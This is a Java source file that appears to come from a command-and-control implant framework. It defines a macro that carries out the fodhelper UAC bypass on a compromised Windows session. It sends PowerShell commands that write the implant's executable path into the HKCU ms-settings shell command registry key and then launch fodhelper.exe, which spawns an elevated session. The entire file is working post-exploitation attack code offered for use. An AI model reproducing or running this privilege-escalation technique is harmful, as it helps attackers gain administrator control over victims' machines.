package c2.session.macro;

import c2.Commands;
import c2.HarvestProcessor;
import c2.session.IOManager;

public class SpawnFodhelperElevatedSessionMacro extends AbstractCommandMacro {

	public static final String COMMAND = "spawn_fodhelper_elevated_session";
	public static final String NEW_ITEM_CMD = "powershell.exe -c \"New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force\"";
	public static final String NEW_ITEM_PROP_CMD = "powershell.exe -c \"New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force";
	public static final String SET_ITEM_PROP_CMD_B = "' -Force \"";
	public static final String SET_ITEM_PROP_CMD_A = "powershell.exe -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value '";
	
	public static final String ENGAGE_FODHELPER_CMD = "fodhelper.exe";
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase(COMMAND);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		sendCommand(Commands.CLIENT_GET_EXE_CMD, sessionId, outcome);
		String clientCmd = awaitResponse(sessionId, outcome);
		clientCmd = clientCmd.replace("\r", "");
		clientCmd = clientCmd.replace("\n", "");
		sendCommand(NEW_ITEM_CMD, sessionId, outcome);
		sendCommand(NEW_ITEM_PROP_CMD, sessionId, outcome);
		String fodHelperCmd = SET_ITEM_PROP_CMD_A + clientCmd + SET_ITEM_PROP_CMD_B;
		sendCommand(fodHelperCmd, sessionId, outcome);
		sendCommand(ENGAGE_FODHELPER_CMD, sessionId, outcome);
		outcome.addMacroMessage("Fodhelper engaged, new elevated session should be available if current user has elevated privs");
		return outcome;
	}

	@Override
	public String getReadableName() {
		return "Spawn FOD Helper elevated session macro";
	}

	@Override
	public String getInvocationCommandDescription() {
		return COMMAND;
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro uses the FOD Helper UAC bypass to spawn an elevated session.";
	}

}
